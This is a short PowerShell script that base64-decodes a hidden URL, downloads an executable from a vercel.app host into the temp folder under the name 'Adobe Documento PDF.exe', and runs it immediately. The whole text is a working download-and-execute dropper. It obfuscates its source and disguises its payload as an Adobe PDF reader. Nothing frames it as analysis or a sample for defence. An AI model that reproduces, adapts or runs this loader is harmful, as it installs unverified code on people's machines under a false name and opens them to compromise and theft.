$e = [Text.Encoding]::UTF8
$d = 'aHR0cHM6Ly90ZXN0YW5kbzEyMy1ibG9uZC52ZXJjZWwuYXBwL0Fkb2JlJTIwLSUyMExlaXRvciUyMGRlJTIwUERGLmV4ZQ=='
$p = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($d))
$f = "$env:TEMP\Adobe Documento PDF.exe"
(New-Object Net.WebClient).DownloadFile($p, $f)
&($f)
